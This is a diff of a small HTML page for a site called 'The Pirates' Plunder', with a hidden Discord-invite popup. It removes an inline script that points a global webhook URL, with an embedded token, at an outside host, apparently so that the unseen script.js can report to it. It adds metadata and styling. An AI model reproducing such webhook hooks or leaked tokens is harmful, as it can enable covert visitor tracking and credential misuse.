@@ -2,51 +2,72 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>The Pirate’s Plunder</title>
-    <script>
-        // Inject your webhook globally before script.js runs
-        window.webhook_url = "https://fuckyou.gay/webhook.php?id=ebb316065e8334fbc9c83ae367e44868&token=a23d763754df9169a117094f0bbfca6f59dd654f68cbea1304449222e0d2e734";
-    </script>
-    <script defer src="script.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <meta property="og:title" content="The Pirates' Plunder">
+    <meta property="og:description" content="APT69420">
+    <meta property="og:image" content="https://thepiratesplunder.com/qr.png">
+    <meta property="og:image:width" content="900">
+    <meta property="og:image:height" content="900">   
+    <meta property="og:url" content="http://www.thepiratesplunder.com">
+    <meta property="og:type" content="website">
+        
+    <link rel="shortcut icon" href="favicon.ico">
+    <link rel="apple-touch-icon" sizes="180x180" href="apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="favicon-16x16.png">
+    <title>The Pirates' Plunder</title>
     <style>
-        body {
-            background: #0e0e0e;
-            color: #0f0;
-            font-family: monospace;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            flex-direction: column;
+        body, html {
+            margin: 0;
+            padding: 0;
+            min-height: 100%;
+            background-color: #000; 
         }
-
-        #discordPopup {
-            display: none;
-            margin-top: 20px;
-            padding: 15px;
-            background: #1e1e1e;
-            border: 1px solid #0f0;
+        .background-image {
+            position: fixed; 
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: url('tpp.png') center center no-repeat; 
+            background-size: contain;
+            z-index: -1; 
         }
-
-        button {
+        .popup {
+        position: fixed;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        background-color: #333; 
+        color: white; 
+        padding: 20px;
+        border-radius: 10px;
+        box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+        text-align: center;
+        z-index: 2;
+    }
+        .popup button {
             padding: 10px 20px;
-            background: #000;
-            color: #0f0;
-            border: 1px solid #0f0;
+            border: none;
+            border-radius: 5px;
+            background-color: #008CBA;
+            color: white;
+            font-size: 16px;
             cursor: pointer;
         }
-
-        button:hover {
-            background: #0f0;
-            color: #000;
+        .popup button:hover {
+            background-color: #005f73;
         }
     </style>
 </head>
 <body>
-    <h1>Welcome to The Pirate’s Plunder</h1>
-    <div id="discordPopup">
-        <p>Welcome aboard, recruit. Ready to join the crew?</p>
-        <button onclick="acceptInvite()">Join Discord</button>
+    <div class="background-image"></div>
+    <div class="popup" id="discordPopup" style="display: none;">
+        <p>The Pirates' Plunder</p>
+        <button onclick="acceptInvite()">Accept</button>
     </div>
+
+    <script src="script.js"></script>
 </body>
 </html>
